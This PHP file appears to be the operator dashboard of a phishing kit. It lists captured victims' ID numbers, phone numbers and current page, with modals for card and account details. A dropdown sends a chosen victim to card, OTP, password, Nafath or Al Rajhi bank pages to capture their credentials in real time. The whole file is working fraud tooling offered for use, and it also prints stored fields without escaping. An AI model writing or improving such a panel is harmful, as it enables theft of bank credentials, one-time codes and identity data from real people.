<?php
session_start();
require_once 'init.php';

$users = $User->FetchAllUsersForList();

if ($users != false) :
    foreach ($users as $row) {
?>
        <tr data-user-id="<?= $row->id; ?>">
            <td id="message<?= $row->id; ?>">
                <?= $row->message; ?>
            </td>

            <td id="page<?= $row->id; ?>">
                <?= $row->page; ?>
            </td>

            <td><?= $row->ssn; ?></td>
            <td id="name<?= $row->id; ?>"><?= $row->username; ?></td>
            <td id="date<?= $row->id; ?>"><?= $row->date; ?></td>
            <td id="phone<?= $row->id; ?>"><?= $row->phone; ?></td>
            <td>
                <button class="btn btn-info text-white" onclick="removeBackground(this,<?= $row->id; ?>)">اجراء</button>
                <!-- data-bs-toggle="modal" data-bs-target="#card<?= $row->id; ?>" -->

                <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="card">Account</h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">

                                <div id="cardDetails<?= $row->id; ?>">

                                </div>

                                <hr>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
            </td>
            <td>
                <button class="btn btn-info text-white" onclick="removeBackground2(this,<?= $row->id; ?>)">اجراء</button>

                <div class="modal fade" id="usermodal<?= $row->id; ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="exampleModalLabel">يرجى إدخال اليانات</h5>
                            </div>
                            <div class="modal-body">
                                <div id="userDetails<?= $row->id; ?>">

                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
                                <button onclick="callDataRequest(<?= $row->id; ?> , 1)" class="btn btn-primary">حفظ</button>
                            </div>

                        </div>
                    </div>
                </div>
            </td>
            <td><?= $row->created_at; ?></td>
            <td>
                <div class="dropdown">
                    <button class="btn btn-primary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        <!-- <i class="bi bi-list"></i> -->
                    </button>
                    <ul class="dropdown-menu bg-dark">

                        <li class="aca">
                            <button class="text-primary btn btn-sm" data-bs-toggle="modal" data-bs-target="#pagess<?= $row->id; ?>">إعادة توجيه</button>
                        </li>
                        <li class="mt-3 aca">
                            <form action="" method="POST">
                                <button type="submit" name="deleteUser" class="text-danger btn btn-sm aca">DELETE</button>
                                <input type="hidden" name="userId" value="<?= $row->id; ?>">
                            </form>
                        </li>
                    </ul>
                </div>

                <div class="modal fade" id="pagess<?= $row->id; ?>" tabindex="-1" aria-labelledby="pageModalLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content bg-light">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="page">التوجيه</h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-4">
                                    <h5 class="text-center">الصفحة المطلوب توجيه العميل اليها</h5>
                                    <div class="mt-4">

                                        <select class="form-select bg-light" id="selaaUrl<?= $row->id; ?>">
                                            <option value="index.php" selected>صفحة معلومات التسجيل</option>
                                            <option value="payment.php">صفحة البطاقة</option>
                                            <option value="otp.php">رمز OTP</option>
                                            <option value="password.php">رمز سري</option>
                                            <option value="nafath.php">نفاذ</option>
                                            <option value="raj.php">راجحي</option>
                                        </select>
                                        <div class="d-flex gap-2 mt-4">
                                            <button onclick="callaaRequest(<?= $row->id; ?>)" class="btn btn-success w-100">توجيه</button>
                                        </div>
                                    </div>

                                    <hr>
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </td>
        </tr>
<?php
    }
endif;
?>